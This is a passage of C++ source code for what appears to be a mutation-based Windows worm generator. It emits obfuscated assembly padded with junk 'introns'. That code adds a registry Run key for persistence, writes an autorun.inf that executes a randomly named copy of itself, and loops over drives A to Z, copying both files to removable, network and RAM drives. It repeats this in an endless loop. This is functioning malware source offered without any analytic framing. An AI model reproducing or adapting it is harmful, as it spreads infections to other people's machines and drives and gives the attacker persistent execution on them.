zer0(0);
addnumber("\'SOFT\'");
file << "       _writeDWord" << endl; CreateAnIntron();

file << "       _nopsA" << endl; CreateAnIntron();
addnumber("4");
file << "       _nopdA" << endl; CreateAnIntron();
file << "       _saveWrtOff" << endl; CreateAnIntron();
zer0(0);
addnumber("\'WARE\'");
file << "       _writeDWord" << endl; CreateAnIntron();

file << "       _nopsA" << endl; CreateAnIntron();
addnumber("4");
file << "       _nopdA" << endl; CreateAnIntron();
file << "       _saveWrtOff" << endl; CreateAnIntron();
zer0(0);
addnumber("\'\\Mic\'");
file << "       _writeDWord" << endl; CreateAnIntron();

file << "       _nopsA" << endl; CreateAnIntron();
addnumber("4");
file << "       _nopdA" << endl; CreateAnIntron();
file << "       _saveWrtOff" << endl; CreateAnIntron();
zer0(0);
addnumber("\'roso\'");
file << "       _writeDWord" << endl; CreateAnIntron();

file << "       _nopsA" << endl; CreateAnIntron();
addnumber("4");
file << "       _nopdA" << endl; CreateAnIntron();
file << "       _saveWrtOff" << endl; CreateAnIntron();
zer0(0);
addnumber("\'ft\\W\'");
file << "       _writeDWord" << endl; CreateAnIntron();

file << "       _nopsA" << endl; CreateAnIntron();
addnumber("4");
file << "       _nopdA" << endl; CreateAnIntron();
file << "       _saveWrtOff" << endl; CreateAnIntron();
zer0(0);
addnumber("\'indo\'");
file << "       _writeDWord" << endl; CreateAnIntron();

file << "       _nopsA" << endl; CreateAnIntron();
addnumber("4");
file << "       _nopdA" << endl; CreateAnIntron();
file << "       _saveWrtOff" << endl; CreateAnIntron();
zer0(0);
addnumber("\'ws\\C\'");
file << "       _writeDWord" << endl; CreateAnIntron();

file << "       _nopsA" << endl; CreateAnIntron();
addnumber("4");
file << "       _nopdA" << endl; CreateAnIntron();
file << "       _saveWrtOff" << endl; CreateAnIntron();
zer0(0);
addnumber("\'urre\'");
file << "       _writeDWord" << endl; CreateAnIntron();

file << "       _nopsA" << endl; CreateAnIntron();
addnumber("4");
file << "       _nopdA" << endl; CreateAnIntron();
file << "       _saveWrtOff" << endl; CreateAnIntron();
zer0(0);
addnumber("\'ntVe\'");
file << "       _writeDWord" << endl; CreateAnIntron();

file << "       _nopsA" << endl; CreateAnIntron();
addnumber("4");
file << "       _nopdA" << endl; CreateAnIntron();
file << "       _saveWrtOff" << endl; CreateAnIntron();
zer0(0);
addnumber("\'rsio\'");
file << "       _writeDWord" << endl; CreateAnIntron();

file << "       _nopsA" << endl; CreateAnIntron();
addnumber("4");
file << "       _nopdA" << endl; CreateAnIntron();
file << "       _saveWrtOff" << endl; CreateAnIntron();
zer0(0);
addnumber("\'n\\Ru\'");
file << "       _writeDWord" << endl; CreateAnIntron();

file << "       _nopsA" << endl; CreateAnIntron();
addnumber("4");
file << "       _saveWrtOff" << endl; CreateAnIntron();
zer0(0);
addnumber("\'n\'");
file << "       _writeDWord" << endl; CreateAnIntron();


GetAddress("hRegKey");
file << "       _push" << endl; CreateAnIntron();
GetAddress("stSubKey");
file << "       _push" << endl; CreateAnIntron();
zer0(0);
addnumber("HKEY_LOCAL_MACHINE");
file << "       _push" << endl; CreateAnIntron();
CallAPI("hRegCreateKeyA");

zer0(0);
addnumber("15");
file << "       _push                ; 15" << endl; CreateAnIntron();
GetAddress("Driveletter3");
file << "       _push                ; C:" << static_cast<char>(92) << "evolusss.exe" << endl; CreateAnIntron();
zer0(0);
addnumber("REG_SZ");
file << "       _push                ; REG_SZ" << endl; CreateAnIntron();
zer0(0);
file << "       _push                ; 0x0" << endl; CreateAnIntron();
file << "       _push                ; 0x0" << endl; CreateAnIntron();
GetAddress("hRegKey");
file << "       _getdata" << endl; CreateAnIntron();
file << "       _push                ; dword[hRegKey]" << endl; CreateAnIntron();
CallAPI("hRegSetValueExA");

GetAddress("AutoStartContentStart");
file << "       _nopdA" << endl; CreateAnIntron();
file << "       _saveWrtOff" << endl; CreateAnIntron();
zer0(0);
addnumber("\'[Aut\'");
file << "       _writeDWord" << endl; CreateAnIntron();

file << "       _nopsA" << endl; CreateAnIntron();
addnumber("4");
file << "       _nopdA" << endl; CreateAnIntron();
file << "       _saveWrtOff" << endl; CreateAnIntron();
zer0(0);
addnumber("\'orun\'");
file << "       _writeDWord" << endl; CreateAnIntron();

file << "       _nopsA" << endl; CreateAnIntron();
addnumber("4");
file << "       _nopdA" << endl; CreateAnIntron();
file << "       _saveWrtOff" << endl; CreateAnIntron();
zer0(0);
addnumber("0x530A0D5D");
file << "       _writeDWord" << endl; CreateAnIntron();

file << "       _nopsA" << endl; CreateAnIntron();
addnumber("4");
file << "       _nopdA" << endl; CreateAnIntron();
file << "       _saveWrtOff" << endl; CreateAnIntron();
zer0(0);
addnumber("\'hell\'");
file << "       _writeDWord" << endl; CreateAnIntron();

file << "       _nopsA" << endl; CreateAnIntron();
addnumber("4");
file << "       _nopdA" << endl; CreateAnIntron();
file << "       _saveWrtOff" << endl; CreateAnIntron();
zer0(0);
addnumber("\'Exec\'");
file << "       _writeDWord" << endl; CreateAnIntron();

file << "       _nopsA" << endl; CreateAnIntron();
addnumber("4");
file << "       _nopdA" << endl; CreateAnIntron();
file << "       _saveWrtOff" << endl; CreateAnIntron();
zer0(0);
addnumber("\'ute=\'");
file << "       _writeDWord" << endl; CreateAnIntron();

file << "       _nopsA" << endl; CreateAnIntron();
addnumber("4");
file << "       _nopdA" << endl; CreateAnIntron();
file << "       _saveWrtOff" << endl; CreateAnIntron();
GetAddress("RandomFileName");
file << "       _nopdB" << endl; CreateAnIntron();
file << "       _getdata" << endl; CreateAnIntron();
file << "       _writeDWord" << endl; CreateAnIntron();

file << "       _nopsA" << endl; CreateAnIntron();
addnumber("4");
file << "       _nopdA" << endl; CreateAnIntron();
file << "       _saveWrtOff" << endl; CreateAnIntron();
file << "       _nopsB" << endl; CreateAnIntron();
addnumber("4");
file << "       _getdata" << endl; CreateAnIntron();
file << "       _writeDWord" << endl; CreateAnIntron();

file << "       _nopsA" << endl; CreateAnIntron();
addnumber("4");
file << "       _nopdA" << endl; CreateAnIntron();
file << "       _saveWrtOff" << endl; CreateAnIntron();
zer0(0);
addnumber("\'.exe\'");
file << "       _writeDWord" << endl; CreateAnIntron();

file << "       _nopsA" << endl; CreateAnIntron();
addnumber("4");
file << "       _nopdA" << endl; CreateAnIntron();
file << "       _saveWrtOff" << endl; CreateAnIntron();
zer0(0);
addnumber("0x73550A0D");
file << "       _writeDWord" << endl; CreateAnIntron();

file << "       _nopsA" << endl; CreateAnIntron();
addnumber("4");
file << "       _nopdA" << endl; CreateAnIntron();
file << "       _saveWrtOff" << endl; CreateAnIntron();
zer0(0);
addnumber("\'eAut\'");
file << "       _writeDWord" << endl; CreateAnIntron();

file << "       _nopsA" << endl; CreateAnIntron();
addnumber("4");
file << "       _nopdA" << endl; CreateAnIntron();
file << "       _saveWrtOff" << endl; CreateAnIntron();
zer0(0);
addnumber("\'opla\'");
file << "       _writeDWord" << endl; CreateAnIntron();

file << "       _nopsA" << endl; CreateAnIntron();
addnumber("3");
file << "       _nopdA" << endl; CreateAnIntron();
file << "       _saveWrtOff" << endl; CreateAnIntron();
zer0(0);
addnumber("\'ay=1\'");
file << "       _writeDWord" << endl; CreateAnIntron();

GetAddress("autoruninf");
file << "       _nopdA" << endl; CreateAnIntron();
file << "       _saveWrtOff" << endl; CreateAnIntron();
zer0(0);
addnumber("\'auto\'");
file << "       _writeDWord" << endl; CreateAnIntron();

file << "       _nopsA" << endl; CreateAnIntron();
addnumber("4");
file << "       _nopdA" << endl; CreateAnIntron();
file << "       _saveWrtOff" << endl; CreateAnIntron();
zer0(0);
addnumber("\'run.\'");
file << "       _writeDWord" << endl; CreateAnIntron();

file << "       _nopsA" << endl; CreateAnIntron();
addnumber("3");
file << "       _saveWrtOff" << endl; CreateAnIntron();
zer0(0);
addnumber("\'.inf\'");
file << "       _writeDWord" << endl; CreateAnIntron();

zer0(0);
file << "       _push                ; 0x0" << endl; CreateAnIntron();
addnumber("2");
file << "       _push                ; 0x2" << endl; CreateAnIntron();
zer0(0);
addnumber("CREATE_ALWAYS");
file << "       _push                ; CREATE_ALWAYS" << endl; CreateAnIntron();
zer0(0);
file << "       _push                ; 0x0" << endl; CreateAnIntron();
file << "       _push                ; 0x0" << endl; CreateAnIntron();
addnumber("0xC0000000");
file << "       _push                ; 0xC0000000" << endl; CreateAnIntron();
GetAddress("autoruninf");
file << "       _push                ; autoruninf" << endl; CreateAnIntron();
CallAPI("hCreateFileA");

GetAddress("FileHandle");
file << "       _saveWrtOff" << endl; CreateAnIntron();
file << "       _nopsA" << endl; CreateAnIntron();
file << "       _writeDWord           ; dword[FileHandle]=eax" << endl; CreateAnIntron();

zer0(0);
file << "       _push                 ; 0x0" << endl; CreateAnIntron();
GetAddress("MapHandle");
file << "       _push                 ; Trash-Address" << endl; CreateAnIntron();
zer0(0);
addnumber("(AutoStartContentEnd-AutoStartContentStart)");
file << "       _push                 ; Size of Buffer" << endl; CreateAnIntron();
GetAddress("AutoStartContentStart");
file << "       _push                 ; Buffer to write" << endl; CreateAnIntron();
GetAddress("FileHandle");
file << "       _getdata" << endl; CreateAnIntron();
file << "       _push                 ; FileHandle" << endl; CreateAnIntron();
CallAPI("hWriteFile");

GetAddress("FileHandle");
file << "       _getdata" << endl; CreateAnIntron();
file << "       _push" << endl; CreateAnIntron();
CallAPI("hCloseHandle");

file << "       _getEIP" << endl; CreateAnIntron();
file << "       _sub0001" << endl; CreateAnIntron();
file << "       _sub0001" << endl; CreateAnIntron();
file << "       _sub0001" << endl; CreateAnIntron();
file << "       _sub0001" << endl; CreateAnIntron();
file << "       _sub0001" << endl; CreateAnIntron();
file << "       _saveJmpOff                  ; Loop over Drive Letter A-Z" << endl; CreateAnIntron();

file << "       _pushall" << endl; CreateAnIntron();
zer0(0);
file << "               _nopdB                       ; RegB=0" << endl; CreateAnIntron();
file << "       " << endl; CreateAnIntron();
GetAddress("Driveletter1-1");
file << "               _saveWrtOff" << endl; CreateAnIntron();
zer0(0);
addnumber("0x003A4100");
file << "               _writeDWord" << endl; CreateAnIntron();
file << "       " << endl; CreateAnIntron();
GetAddress("Driveletter2-1");
file << "               _saveWrtOff" << endl; CreateAnIntron();
zer0(0);
addnumber("0x5C3A4100");
file << "               _writeDWord" << endl; CreateAnIntron();
file << "       " << endl; CreateAnIntron();
file << "       " << endl; CreateAnIntron();
zer0(0);
addnumber("26");
file << "               _nopdA                       ; counter" << endl; CreateAnIntron();
file << "       " << endl; CreateAnIntron();
file << "               _getEIP" << endl; CreateAnIntron();
file << "               _sub0001" << endl; CreateAnIntron();
file << "               _sub0001" << endl; CreateAnIntron();
file << "               _sub0001" << endl; CreateAnIntron();
file << "               _sub0001" << endl; CreateAnIntron();
file << "               _sub0001" << endl; CreateAnIntron();
file << "               _saveJmpOff                  ; Loop over Drive Letter A-Z" << endl; CreateAnIntron();

file << "               _pushall" << endl; CreateAnIntron();
file << "       " << endl; CreateAnIntron();
GetAddress("Driveletter1+2");
file << "                       _saveWrtOff" << endl; CreateAnIntron();
zer0(1);
file << "                       _writeByte" << endl; CreateAnIntron();

GetAddress("Driveletter1");
file << "                       _push" << endl; CreateAnIntron();
CallAPI("hGetDriveTypeA");

file << "                       _nopsA" << endl; CreateAnIntron();
file << "                       _save        ; save Drive type" << endl; CreateAnIntron();

zer0(1);
addnumber("0x0010");
file << "                       _push" << endl; CreateAnIntron();

zer0(1);
addnumber("2");
subsaved(1);
file << "                       _JnzDown     ; Is DRIVE_REMOVABLE?" << endl;
file << "                           _pop      ; Stack=0x0010" << endl;
file << "                           _push" << endl;
file << "                           _nopdB    ; RegB=0x0010 -> FILE+AUTOSTART" << endl;
file << "                           _nopREAL" << endl;

file << "                       _pop            ; Trash away" << endl; CreateAnIntron();

zer0(1);
addnumber("0x0040");
file << "                       _push" << endl; CreateAnIntron();

zer0(1);
addnumber("3");
subsaved(1);
file << "                       _JnzDown        ; Is DRIVE_FIXED?" << endl;
file << "                           _pop" << endl;
file << "                           _push       ; RegB=0x0040 -> FILE" << endl;
file << "                           _nopdB" << endl;
file << "                           _nopREAL" << endl;

file << "                       _pop            ; Trash away" << endl; CreateAnIntron();

zer0(1);
addnumber("0x0010");
file << "                       _push" << endl; CreateAnIntron();

zer0(1);
addnumber("4");
subsaved(1);
file << "                       _JnzDown        ; Is DRIVE_REMOTE?" << endl;
file << "                           _pop" << endl;
file << "                           _push       ; RegB=0x0010 -> FILE+AUTOSTART" << endl;
file << "                           _nopdB" << endl;
file << "                           _nopREAL" << endl;


zer0(1);
addnumber("6");
subsaved(1);
file << "                       _JnzDown        ; Is DRIVE_RAMDISK?" << endl;
file << "                           _pop" << endl;
file << "                           _push       ; RegB=0x0010 -> FILE+AUTOSTART" << endl;
file << "                           _nopdB" << endl;
file << "                           _nopREAL" << endl;

file << "                       _pop            ; Trash away" << endl; CreateAnIntron();

file << "               ; ############################################################################" << endl; CreateAnIntron();
file << "               ; ##### Copy autorun.inf (or not)" << endl; CreateAnIntron();
file << "       " << endl; CreateAnIntron();
GetAddress("autoruninf");
file << "                       _nopdA               ; address to " << static_cast<char>(34) << "autorun.inf" << static_cast<char>(34) << " to RegA" << endl; CreateAnIntron();
GetAddress("Driveletter2");
file << "                       _nopdD               ; address to " << static_cast<char>(34) << "?:" << static_cast<char>(92) << "autorun.inf" << static_cast<char>(34) << " to RegD" << endl; CreateAnIntron();
file << "       " << endl; CreateAnIntron();
file << "                       _nopsB" << endl; CreateAnIntron();
file << "                       _save" << endl; CreateAnIntron();
file << "       " << endl; CreateAnIntron();
file << "       " << endl; CreateAnIntron();
zer0(1);
addnumber("0x0010");
subsaved(1);
file << "                       _JnzDown" << endl;
file << "                           _nopREAL             ; BC1=0x0" << endl;
file << "                           _push                ; bFailIfExists=FALSE" << endl;
file << "                           _nopsD" << endl;
file << "                           _push                ; lpNewFileName=" << static_cast<char>(34) << "?:" << static_cast<char>(92) << "autorun.inf" << static_cast<char>(34) << "" << endl;
file << "               " << endl; CreateAnIntron();
file << "               " << endl; CreateAnIntron();
GetAddress("hCopyFileA");
file << "                       _getdata" << endl; CreateAnIntron();
file << "                       _nopdD" << endl; CreateAnIntron();
file << "       " << endl; CreateAnIntron();
zer0(1);
addnumber("0x0010");
subsaved(1);
file << "                       _JnzDown" << endl;
file << "                           _nopsA" << endl;
file << "                           _push                ; lpExistingFileName=" << static_cast<char>(34) << "autorun.inf" << static_cast<char>(34) << "" << endl;
file << "                           _nopsD" << endl;
file << "                           _call                ; stdcall dword[hCopyFileA]" << endl;
file << "       " << endl; CreateAnIntron();

file << "                       _nopsB" << endl; CreateAnIntron();
file << "                       _save                ; restore BC2 (=RegB)" << endl; CreateAnIntron();

zer0(1);
addnumber("0x0040");
file << "                       _push" << endl; CreateAnIntron();

zer0(1);
addnumber("0x0010");
subsaved(1);
file << "                       _JnzDown" << endl;
file << "                           _pop" << endl;
file << "                           _push" << endl;
file << "                           _nopdB" << endl;
file << "                           _save             ; also copy child executable" << endl;

file << "                       _pop            ; Trash away" << endl; CreateAnIntron();

file << "               " << endl; CreateAnIntron();
file << "               ; ##### End Copy autorun.inf (or not)" << endl; CreateAnIntron();
file << "               ; ############################################################################" << endl; CreateAnIntron();


file << "               ; ############################################################################" << endl; CreateAnIntron();
file << "               ; ##### Copy child executable (or not)" << endl; CreateAnIntron();
file << "               " << endl; CreateAnIntron();
GetAddress("Driveletter1+2");
file << "                       _saveWrtOff" << endl; CreateAnIntron();
zer0(1);
addnumber("0x5C");
file << "                       _writeByte" << endl; CreateAnIntron();
file << "               " << endl; CreateAnIntron();
GetAddress("RandomFileName");
file << "                       _nopdA               ; address to " << static_cast<char>(34) << "NNNNNNNN.exe" << static_cast<char>(34) << " to RegA" << endl; CreateAnIntron();
GetAddress("Driveletter1");
file << "                       _nopdD               ; address to " << static_cast<char>(34) << "?:" << static_cast<char>(92) << "NNNNNNNN.exe" << static_cast<char>(34) << " to RegD" << endl; CreateAnIntron();
file << "               " << endl; CreateAnIntron();
file << "                       _nopsB" << endl; CreateAnIntron();
file << "                       _save" << endl; CreateAnIntron();
file << "               " << endl; CreateAnIntron();
zer0(1);
addnumber("0x0040");
subsaved(1);
file << "                       _JnzDown" << endl;
file << "                           _nopREAL" << endl;
file << "                           _push                ; bFailIfExists=FALSE" << endl;
file << "                           _nopsD" << endl;
file << "                           _push                ; lpNewFileName=" << static_cast<char>(34) << "?:" << static_cast<char>(92) << "NNNNNNNN.exe" << static_cast<char>(34) << "" << endl;
file << "               " << endl; CreateAnIntron();
file << "               " << endl; CreateAnIntron();
GetAddress("hCopyFileA");
file << "                       _getdata" << endl; CreateAnIntron();
file << "                       _nopdD" << endl; CreateAnIntron();
file << "               " << endl; CreateAnIntron();
zer0(1);
addnumber("0x0040");
subsaved(1);
file << "                       _JnzDown" << endl;
file << "                           _nopsA" << endl;
file << "                           _push                ; lpExistingFileName=" << static_cast<char>(34) << "NNNNNNNN.exe" << static_cast<char>(34) << "" << endl;
file << "                           _nopsD" << endl;
file << "                           _call                ; stdcall dword[hCopyFileA]" << endl;

file << "               ; ##### End Copy child executable (or not)" << endl; CreateAnIntron();
file << "               ; ############################################################################" << endl; CreateAnIntron();

file << "               _popall" << endl; CreateAnIntron();
file << "       " << endl; CreateAnIntron();
GetAddress("Driveletter1");
file << "               _saveWrtOff" << endl; CreateAnIntron();
file << "               _getdata" << endl; CreateAnIntron();
addnumber("1");
file << "               _writeByte" << endl; CreateAnIntron();
file << "       " << endl; CreateAnIntron();
GetAddress("Driveletter2");
file << "               _saveWrtOff" << endl; CreateAnIntron();
file << "               _getdata" << endl; CreateAnIntron();
addnumber("1");
file << "               _writeByte" << endl; CreateAnIntron();
file << "       " << endl; CreateAnIntron();
file << "       " << endl; CreateAnIntron();
file << "               _nopsA" << endl; CreateAnIntron();
file << "               _sub0001" << endl; CreateAnIntron();
file << "               _nopdA" << endl; CreateAnIntron();
file << "       " << endl; CreateAnIntron();
file << "               _JnzUp" << endl; CreateAnIntron();

file << "       _popall" << endl; CreateAnIntron();
zer0(0);
addnumber("0x6666");
file << "       _push" << endl; CreateAnIntron();
CallAPI("hSleep");


zer0(0);
addnumber("1");
file << "       _JnzUp" << endl; CreateAnIntron();

file << "" << endl;
file << "EndAminoAcids1:" << endl;
file << "" << endl;
file << "; ##################################################################" << endl;
file << "" << endl;
for (int i=0; i<500; i++) { CreateAnIntron(); }
file << "EndAmino:" << endl;
for (int i=0; i<500; i++) { CreateAnIntron(); }
file << ".end start";

        
    file.close();
    cout << "Created:" << endl;
    cout << "Translator Introns: " << cIntronN << endl;
    cout << "Codon Start/Stop Introns: " << IntronSTST << endl;
    cout << "Codon NOP Introns: " << IntronNOP << endl << endl;    
    cout << "Finish :)" << endl;
    //cin.get();
    return(666);
}
